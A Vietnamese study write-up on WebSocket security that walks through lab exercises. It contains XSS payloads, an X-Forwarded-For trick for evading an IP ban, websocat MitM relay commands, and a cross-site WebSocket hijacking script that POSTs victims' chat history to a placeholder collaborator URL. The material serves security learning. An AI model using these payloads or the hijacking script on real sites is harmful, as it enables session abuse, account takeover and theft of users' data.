# Bug WebSockets basic

---

## WebSockets là gì?

- WebSockets là một giao thức chho phép tạo kết nối hai chiều (full-duplex) được khởi tạo qua HTTP(S).
  
- Chúng thường được sử dụng trong các ứng dụng web hiện đại để truyền tải dữ liệu và các lưu lượng không đồng bộ khác.

---

## Sự khác biệt giữa HTTP và WebSockets

- HTTP:

  - Cơ chế: request → response, client - server, xong là hết, 1 giao dịch (transaction) độc lập. Mỗi lần cần dữ liệu mới, client phải gửi request mới. Kể cả khi connection TCP còn     mở (HTTP keep-alive), thì nó vẫn chỉ phục vụ từng request → response riêng lẻ.
 
- WebSockets:

  - Cơ chế: ban đầu khởi tạo (bắt tay) thông qua HTTP(S) trước. Sau đó “nâng cấp” (upgrade) connection thành WebSocket. Tuy nhiên WebSocket sẽ thiết lập một kết nối liên tục. Khi      được kích hoạt, nó cho phép cả hai bên truyền tin nhắn liên tục mà không bị gián đoạn.
 
  - Đặc điểm:

    - Connection lâu dài, giữ kết nối (long-lived).
    
    - 2 chiều (full-duplex): cả client và server đều có thể gửi message bất kỳ lúc nào, không cần chờ request.
   
    - Không mang tính “transaction” request/response như HTTP.

    - Rất hiệu quả khi cần real-time.
   
  &rarr; WebSockets = mở 1 đường dây call giữa browser ↔ server và giữ máy luôn “on call” để chat real-time.
   
  - Ví dụ:
 
    - Ứng dụng chứng khoán: server push giá cổ phiếu ngay khi thay đổi.

    - Chat app: tin nhắn từ bạn bè hiển thị tức thì, không cần polling.

**NOTE**: _Tuy nhiên có một điểm đáng chú ý giữa chúng là giống như HTTP, WebSocket không có cơ chế bảo mật tích hợp. Do đó, việc triển khai các biện pháp bảo vệ cần thiết ở cấp ứng dụng phụ thuộc vào nhà phát triển._
   
---

## Kết nối Websocket được thiết lập như thế nào?

- Kết nối WebSocket thường được tạo ra bằng cách sử dụng JavaScript phía client như sau:

  ```
  var ws = new WebSocket("wss://normal-website.com/chat");
  ```

  Giao thức ws thiết lập WebSockets sử dụng một kết nối không được mã hóa. Còn wss sử dụng TLS.

- Để thiết lập kết nối, trình duyệt client và máy chủ thực hiện một cuộc bắt tay WebSocket qua HTTP. Trình duyệt phát đi một yêu cầu bắt tay WebSocket như sau:

  ```http
  GET /chat HTTP/1.1
  Host: normal-website.com
  Sec-WebSocket-Version: 13
  Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
  Connection: keep-alive, Upgrade
  Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
  Upgrade: websocket
  ```

  Nếu server chấp nhận kết nối, nó sẽ trả về một phản hồi WebSocket handshake như sau:

  ```http
  HTTP/1.1 101 Switching Protocols
  Connection: Upgrade
  Upgrade: websocket
  Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
  ```

  &rarr; Một phản hồi với mã trạng thái 101 cho biết rằng máy chủ đã xác nhận kết nối, cho phép WebSocket được khởi tạo. Dữ liệu trao đổi có thể ở nhiều định dạng khác     nhau (HTML, JSON, văn bản, v.v.).

  &rarr; Tại thời điểm này, kết nối mạng vẫn đang mở và có thể được sử dụng để gửi các tin nhắn WebSocket theo cả hai hướng.

  Ví dụ về một GET request WebSocket handshake:

  <img width="1335" height="652" alt="image" src="https://github.com/user-attachments/assets/20e991b1-7044-4482-bf79-23c445bc54bd" />

- Về tổng quan, quá trình diễn ra theo một flows như sau:

  <img width="680" height="483" alt="image" src="https://github.com/user-attachments/assets/ffe7275e-006d-48d5-b741-58769e482559" />

**NOTE**:

- Một vài đặc điểm của WebSocket handshake messages đáng chú ý:

  - Các header như Connection và Upgrade trong cả request và response cho biết rằng đây là một cuộc bắt tay WebSocket.
 
  - Header Sec-WebSocket-Version request chỉ định phiên bản giao thức WebSocket mà client muốn sử dụng. Thông thường, đây là phiên bản 13.
 
  - Header Sec-WebSocket-Key request chứa một giá trị ngẫu nhiên được mã hóa Base64, cái mà nên được tạo ngẫu nhiên trong mỗi yêu cầu bắt tay.
 
  - Header Sec-WebSocket-Accept request chứa một mã hash của giá trị được gửi trong header Sec-WebSocket-Key request, nối với một chuỗi cụ thể được định nghĩa trong đặc       tả giao thức. Điều này được thực hiện để ngăn chặn các phản hồi gây hiểu lầm do cấu hình sai máy chủ hoặc lưu trữ proxy.

---

## WebSocket messages trông như thế nào?

- Khi một kết nối WebSocket đã được thiết lập, các tin nhắn có thể được gửi không đồng bộ theo cả hai hướng bởi máy khách hoặc máy chủ.

- Một tin nhắn đơn giản có thể được gửi từ trình duyệt bằng cách sử dụng JavaScript phía máy khách như sau:

  ```
  ws.send("Peter Wiener");
  ```

- Về nguyên tắc, tin nhắn WebSocket có thể chứa bất kỳ nội dung hoặc định dạng dữ liệu nào.

- Trong các ứng dụng hiện đại, việc sử dụng JSON để gửi dữ liệu có cấu trúc trong các tin nhắn WebSocket là điều phổ biến.

- Ví dụ, một ứng dụng chatbot sử dụng WebSocket có thể gửi một tin nhắn như sau:

  ```json
  {"user":"Hal Pline","content":"I wanted to be a Playstation growing up, not a device to answer your inane questions"}
  ```

- Một công cụ phổ biến cho phép thực hiện tương tác với các message WebSocket là: **Burp Suite**

- Công cụ cho phép ta thực hiện: chặn bắt, xem, phân tích và repeat lại các request/message WebSocket, tương đồng như giao thức HTTP:

  - _**Proxy &rarr; WebSockets history**_: Ta có thể xem, phân tích các message Websocket của ứng dụng trong toàn bộ quá trình giao tiếp client-server.
 
    <img width="1914" height="931" alt="image" src="https://github.com/user-attachments/assets/44aa204a-eed9-408c-ade1-22b23f62fb6d" />
  
    <img width="1919" height="922" alt="image" src="https://github.com/user-attachments/assets/36511c3e-be7a-49b4-8deb-585f0d61ca0a" />

  - _**Proxy &rarr; Intercept**_: Ta có thể chặn bắt, sửa đổi trước khi forward lại cho client hay server xử lý.
 
    <img width="1919" height="926" alt="image" src="https://github.com/user-attachments/assets/fc69974a-037b-4335-8b05-8a48e914b3f3" />

    <img width="1919" height="925" alt="image" src="https://github.com/user-attachments/assets/4c22313d-8d4a-4469-b05e-442e81e35c29" />

  - _**Repeater WebSocket**_: Tương đồng như HTTP, ta cũng có thể repeat các request/message WebSocket để sửa đổi và replay lại chúng
 
    <img width="1919" height="923" alt="image" src="https://github.com/user-attachments/assets/1f315f65-0fa5-437c-972c-fbbef66ff336" />

    &rarr; Giao diện sẽ hơi khác, bên trái panel ta có thể sửa data và chọn gửi cho client hay server, còn bên phải panel hiển thị request/message đã gửi và phản hồi từ server.

---

## Các lỗ hổng WebSockets phổ biến

### Unencrypted Communications / Sensitive Information Disclosure Over Network

- Cũng giống như giao thức HTTP, có http thông thường và http mã hóa là https. Tương tự như vậy, WebSocket có hai dạng là: `wa` và `wss`.

- Do đó, nếu trình duyệt chạy WebSocket (ws://) chạy trên TCP không mã hoá — giống như HTTP (plaintext) &rarr; Tiềm ẩn rủi ro an toàn: tất cả payload, cookie, token, lệnh truyền qua socket có thể bị lộ, bị bắt (sniff) hoặc sửa (modify) bởi attacker thông qua như MiTM,...

- Ví dụ: nếu một ứng dụng `app.example.com` dùng session cookie để auth và cho phép kết nối tới `ws://app.example.com/chat/abc` (plaintext).

  - Trên mạng: attacker ở cùng mạng Wi-Fi / ISP tạo MITM (ví dụ ARP spoofing trong lab). Vì WS là ở dạng plaintext, attacker bắt gói TCP và nhìn thấy handshake lẫn các WebSocket frames.

  - Nếu quá trình trao đổi WebSocket các dạng data nhạy cảm:
 
    - Handshake headers: Sec-WebSocket-Key, Cookie: session=eyJhbGci...

    - Frame text: {"cmd":"deploy","path":"/var/www","token":"abcd1234"}
   
  &rarr; attacker dùng cookie/token để giả danh người dùng hoặc sửa frame để chạy lệnh trái phép.

- Ta có thể test app có hỗ trợ dạng giao tiếp `ws` hay không bằng cách sử dụng các công cụ trực tuyến như: _https://websocket.org/tools/websocket-echo-server_

### Input-Validation Vulnerabilities

- Có thể thấy, WebSocket chỉ là một kênh truyền dữ liệu (thường JSON/text/binary). Nên nếu server nhận dữ liệu từ client và sau đó:

  - phản hồi hoặc broadcast thẳng về cho các client khác, và

  - dữ liệu đó được render trong HTML ở client mà không được escape/encode, thì attacker có thể gửi payload chứa mã HTML/JS → Stored/Reflected XSS via WebSocket.

- Tương tự, nếu server chèn dữ liệu WebSocket vào truy vấn SQL, file XML, shell command, hay eval() mà không validate / sanitize, thì có thể gây SQLi, XXE, RCE hoặc các injection khác.

- Ví dụ về một flow dễ dẫn đến vuln XSS:

  - Client gửi JSON qua WS: `{"message":"Hello"}`
  
  - Server ws nhận dữ liệu, không validate, và broadcast lại cho tất cả client.
  
  - Frontend nhận message và innerHTML += message (thay vì text-safe insertion).
  
  - Nếu attacker gửi `{"message":"<img src=x onerror=alert(1)>”}` → browser sẽ render và execute → XSS.
 
**Lab: Manipulating WebSocket messages to exploit vulnerabilities**

- Website là một web shop online có chức năng live chat cho phép user chat với chatbot:

  <img width="1919" height="947" alt="image" src="https://github.com/user-attachments/assets/fb817edf-af69-4bc5-90cd-b3a4202f55ff" />

- Thực hiện gửi một message bất kỳ cho chatbot như "ba ngoc tai".

- Kiểm tra Burp Proxy &rarr; WebSockets history tab, ta có thể nhận thấy phần chat message ta vừa gửi trên website được gửi và trao đổi client-server thông qua WebSocket message như sau:

  <img width="1919" height="859" alt="image" src="https://github.com/user-attachments/assets/50f54e17-fecf-42b1-bd99-5f05ae6219c9" />

  <img width="1919" height="852" alt="image" src="https://github.com/user-attachments/assets/c9b35660-01d1-4a9b-acdd-434f78a5aa80" />

- Trên website, thực hiện gửi chat với nội dung là các ký tự đặc biệt như: `< > ''`

  <img width="1919" height="886" alt="image" src="https://github.com/user-attachments/assets/48898bfb-2cfb-4b82-9fe2-403f99b3b250" />

  Kiểm tra lại Websockets history tab, ta nhận thấy các ký tự này đã được mã hóa dưới dạng HTML-encoded bởi trình duyệt trước khi đặt vào trong WebSocket message và gửi tới cho server:

  <img width="1919" height="861" alt="image" src="https://github.com/user-attachments/assets/af688f1f-3442-4c64-817b-826202feb1af" />

  Ta có thể quan sát rõ hơn với payload XSS: `<img src=1 onerror='alert(1)'>` đã được HTML-encoded

  <img width="1919" height="862" alt="image" src="https://github.com/user-attachments/assets/9b937c1e-b37c-429a-9d5a-a21fbdda17ff" />

  &rarr; Vậy nếu ta chặn bắt request WebSocket message và thực hiện modify message, sau đó mới gửi đến cho server thì có thể bypass?

- Trên Burp Proxy, ta bật _Intercept_, quay lại website gửi lại đoạn chat với nội dung: `<img src=1 onerror='alert(1)'>`

  Ta có thể thấy, WebSocket message đã được HTML-encoded mà ta chặn bắt trước khi gửi tới cho server:

  <img width="1919" height="860" alt="image" src="https://github.com/user-attachments/assets/28c9afd2-e5a6-4fe4-bd7c-05d0e429f239" />

  Thực hiện modify message về lại payload: `<img src=1 onerror='alert(1)'>` sau đó forward tới server và forward tiếp phản hồi của server về cho clien phản ứng:

  <img width="1919" height="855" alt="image" src="https://github.com/user-attachments/assets/b8d64884-e328-4654-9fcb-aa1a9a1611db" />

  Ta có thể thấy server đã nhận message và phản hồi lại payload XSS cho client, ta forward hết các request:

  <img width="1919" height="852" alt="Screenshot 2025-10-31 095411" src="https://github.com/user-attachments/assets/ead34b45-7c6d-4668-9af8-781ddac5af85" />

- Quay lại website, reload lại trang và ta có thể thấy một thông báo đã được kích hoạt trong trình duyệt → kích hoạt được lỗi XSS và đương nhiên điều này cũng sẽ xảy ra trong trình duyệt của nhân viên hỗ trợ chatbot:

  <img width="1919" height="879" alt="Screenshot 2025-10-31 095711" src="https://github.com/user-attachments/assets/49d322ea-079d-4919-82d7-cbed13b54912" />

- Tuy nhiên, ở một trường hợp khác, nếu ta thực hiện gửi đoạn chat trong live chat với nội dung payload: `<img src=1 onerror='alert(1)'>` thì ngay lập tức có thể bị vào blacklist:

  <img width="1919" height="941" alt="image" src="https://github.com/user-attachments/assets/c249d8db-5c81-4fb6-8e8f-7de6068084d7" />

  Reload lại trang hay back lại và vào lại chức năng live chat vẫn bị fail &rarr; có thể địa chỉ IP của ta đã bị ban.

- Câu hỏi là có cách nào để bypass được cơ chế ban theo địa chỉ IP?

- Lúc này ta có kỹ thuật sử dụng header X-Forwarded-For (XFF) trong trường hợp server dựa vào header HTTP để đưa ra quyết định bảo mật.

- Giải thích ngắn gọn: `X-Forwarded-For` là header do proxy/load-balancer thêm để cho backend biết IP gốc của client &rarr; ta có thể lợi dụng điều này để lừa server về việc che dấu nguồn gốc IP thật của ta.

- Giả sử trong Repeater, ta thực hiện _reconnect_ lại WebSocket handshake, lúc này sẽ bị trả về là "non Websocket response returned" vì ta đã bị cấm:

  <img width="1919" height="1008" alt="image" src="https://github.com/user-attachments/assets/74da3811-dd54-4530-a034-ff12785d4363" />

  Ta thử thêm header: `X-Forwarded-For: 1.1.1.1` vào trong request rồi thử _connect_ lại:

  <img width="1919" height="1008" alt="Screenshot 2025-10-31 103042" src="https://github.com/user-attachments/assets/24c1295e-f899-4721-abbc-aafe7e73a088" />

  Kết quả, connect lại WebSocket handshake thành công &rarr; có thể backend dùng XFF để quyết định “ai bị block” &rarr; bypass thành công

  <img width="1919" height="924" alt="Screenshot 2025-10-31 103105" src="https://github.com/user-attachments/assets/18b79a2b-6b43-4639-adde-2d1f81dbd2ac" />

- Nắm được điều này, ta có thể thực hiện đổi giá trị địa chỉ IP trong header `X-Forwarded-For` để gửi các payload: `<img src=1 onerror='alert(1)'>`

  <img width="1919" height="852" alt="Screenshot 2025-10-31 103611" src="https://github.com/user-attachments/assets/a83ea8ba-1040-42e2-8cbb-899c7e9a1a4e" />

  Tuy nhiên, ta vẫn sẽ bị banned lại.

  Nhưng nhờ cách sửa đổi giá trị địa chỉ IP, ta có thể thử với các obfuscated payload XSS khác như: `<img src=1 oNeRrOr=alert`1`>` để kiểm tra:

  <img width="1919" height="986" alt="Screenshot 2025-10-31 103933" src="https://github.com/user-attachments/assets/eac8b5d6-046d-4529-821b-678f737d2dc0" />

  Kết quả là kích hoạt được lỗi XSS:

  <img width="1919" height="955" alt="Screenshot 2025-10-31 103957" src="https://github.com/user-attachments/assets/02e9567a-86cb-457b-94a0-10292a5bada8" />

### Cross-site WebSocket hijacking

- Cross-site WebSocket hijacking (CSWSH) (cũng được biết đến với cross-origin WebSocket hijacking) liên quan đến lỗ hổng cross-site request forgery (CSRF) trong quá trình WebSocket handshake.

- Nó phát sinh khi yêu cầu bắt tay WebSocket chỉ dựa vào cookie HTTP để xử lý phiên và không chứa bất kỳ token CSRF nào hoặc các giá trị không thể dự đoán khác để bảo vệ.

- Attacker có thể tạo một trang web chủ độc hại bằng chính tên miền của họ, sau đó thiết lập một kết nối WebSocket chéo với ứng dụng có lỗ hổng dễ bị tấn công. Ứng dụng sẽ xử lý kết nối này trong bối cảnh phiên làm việc của người dùng nạn nhân với ứng dụng, tức là lợi dụng sử dụng cookie phiên của nạn nhân để tạo một kết nối WebSocket handshake với trang web chủ của attacker.

- Lúc này trang web của attacker sau đó có thể gửi các message tùy ý đến server bên nạn nhân qua kết nối WebSocket và đọc nội dung của các message nhận được từ server phía nạn nhân.

  &rarr; Khác với CSRF thông thường, kẻ tấn công có được khả năng tương tác hai chiều với ứng dụng bị tấn công. (CSRF chỉ gửi được nhưng không đọc được)

- Với bản chất lỗ hổng như vậy, do đó bước đầu tiên để thực hiện một cuộc tấn công CSWSH là check các quá trình bắt tay WebSocket mà ứng dụng thực hiện và xác định xem chúng có cơ chế để bảo vệ khỏi CSRF thông thường hay không.

- Ta cần thường tìm request WebSocket handshake mà trong dó dựa hoàn toàn vào cookie HTTP để quản lý phiên và không sử dụng bất kỳ token hoặc giá trị random nào trong các tham số yêu cầu.

- Ví dụ như, request WebSocket handshake này bên dưới tiềm tàng lỗ hổng CSRF vì chỉ có cookie session token, mà không có CSRF token hay thậm chí là Origin header:

  ```http
  GET /chat HTTP/1.1
  Host: normal-website.com
  Sec-WebSocket-Version: 13
  Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
  Connection: keep-alive, Upgrade
  Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
  Upgrade: websocket
  ```

### Lab: Cross-site WebSocket hijacking

- Giao diện có chức năng live chat tương tự:
  
  <img width="1919" height="932" alt="image" src="https://github.com/user-attachments/assets/20d1d4f9-8baa-4c3a-b8d9-06f6d5244875" />

- Thực hiện gửi một message bất kỳ lên live chat. Sau đó load lại trang Live chat.

- Tiến hành kiểm tra trong WebSocket history của Burp Suite, nhận thấy có điểm đặc biết là client app gửi một lệnh là "READY" lên server với mục đích là lấy lại nội dung đoạn chat trước đó của người dùng:

  <img width="1919" height="926" alt="image" src="https://github.com/user-attachments/assets/ed6ed544-7000-4384-812d-627f482f5fbb" />

- Trong phần HTTP history ta lại để ý thấy phần request của quá trình bắt tay WebSocket của chức năng Live chat, ta thấy nó chỉ chứa session cookie của user, chứ không có CSRF tokens hay trường Origin &rarr; có thể lợi dùng để tấn công CSWSH.

  <img width="1405" height="718" alt="image" src="https://github.com/user-attachments/assets/68acc5c1-f8f8-402a-ae6a-cac54afb6001" />

- Trong exploit server, ta thực hiện tạo một file /exploit với nội dung phần body là đoạn mã JS như sau:

  ```
  <script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
  </script>
  ```

  Lúc này ta cần thực hiện lừa các nạn nhân click vào đường dẫn dộc hại trên do ta tạo ra, và chỉ cần khi nạn nhân thực hiện truy cập vào đường link, đoạn mã JS trên sẽ thực hiện          khởi tạo một kết nối WebSocket với session cookie là của nạn nhân, và tiếp đó gửi một lệnh "READY" tới server nhắm mục đích là lấy các nội dung đoạn chat trước đó của người dùng này.    (như đã đề cập ở trên)

  Sử dụng domain Burp Collabator để lắng nghe dữ liệu từ server nạn nhân gửi về:

  <img width="1919" height="943" alt="image" src="https://github.com/user-attachments/assets/cd827ca7-648c-485a-8eed-ac0ebab8d36c" />

- Tiến hành gửi link chứa mã độc hại cho nạn nhân để dính bẫy CSWSH, sau đó kiểm tra Burp Collaborator, ta thấy rằng có các request HTTP được gửi về từ server website shopping:

  <img width="1919" height="920" alt="image" src="https://github.com/user-attachments/assets/b0558419-c1ae-4ba0-a1ff-2952498feb39" />

  &rarr; Tồn tại lỗ hổng CSWSH.

  Nội dung dữ liệu của các đoạn chat được gửi về dưới dạng JSON format.

  Kiểm tra các yêu cầu HTTP này của server gửi về, ta sẽ thấy chính là các message chứa nội dung các đoạn chat trước đó của người dùng (vì ta khởi tạo kết nối WebSocket và gửi lệnh        "READY" tới cho server).

- Tiến hành kiểm tra các message, ta phát hiện được rằng nó bị leak ra đoạn chat có chứa thông tin tài khoản của người dùng khác là carlos, bao gồm cả mật khẩu là: _zl4kksijppyotlh3i07x_

  <img width="1917" height="941" alt="image" src="https://github.com/user-attachments/assets/b109103c-31a3-4c90-8393-9a140cdd3d9f" />

- Tiến hành đăng nhập thử và thành công:

  <img width="1919" height="939" alt="image" src="https://github.com/user-attachments/assets/b6563e91-e9d9-42db-b424-6ee0adc0b17d" />

  &rarr; Lợi dụng được lỗ hổng CSWSH để khai thác lấy thông tin nhạy cảm.

---

## Tools & Burp extensions hữu ích

```websocat```

- Một công cụ CLI để thiết lập một kết nối raw với websocket (hỗ trợ wss với flag --insecure nếu bạn muốn bypass TLS cert):

  ```bash
  websocat --insecure wss://10.10.10.10:8000 -v
  ```

- Hoặc ta cũng có thể sử dụng _websocat_ làm server hoặc relay:

  ```bash
  websocat -s 0.0.0.0:8000 #Listen in port 8000
  ```

- Hoặc nếu nhận thấy rằng clients đang kết nối với một HTTP websocket từ mạng cục bộ hiện tại của bạn, bạn có thể thử một cuộc tấn công ARP Spoofing để thực hiện tấn công MitM giữa máy khách và máy chủ. Và một khi client cố gắng kết nối tới bạn, thì bạn có thể sử dụng:

  ```bash
  websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
  ```

```STEWS```

- Một bộ công cụ được phát triển để kiểm tra độ an toàn của WebSocket.

- Cung cấp các chức năng:

  - **Discover**: tìm các WebSockets endpoints trên web bằng cách test một danh sách các tên miền.
 
  - **Fingerprint**: xác định server WebSockets nào đang chạy trên ứng dụng. Thông tin này rất quan trọng vì có thể xác định CVEs trên server.
 
    <img width="1536" height="950" alt="image" src="https://github.com/user-attachments/assets/83fbe7c7-060d-4cfe-a99e-87b68a49fec4" />

  - **Vulnerability Detection**: kiểm tra xem máy chủ WebSockets có bị lỗ hổng WebSockets đã biết hay không, ví dụ như: CSWSH, ... cũng như các CVE khác nhau tùy thuộc vào các thư viện được phát hiện.
 
    <img width="1536" height="587" alt="image" src="https://github.com/user-attachments/assets/b8d5a1e1-3928-4132-a3f2-9edd10c6cdb6" />
 
- Link github: _https://github.com/PalindromeLabs/STEWS_


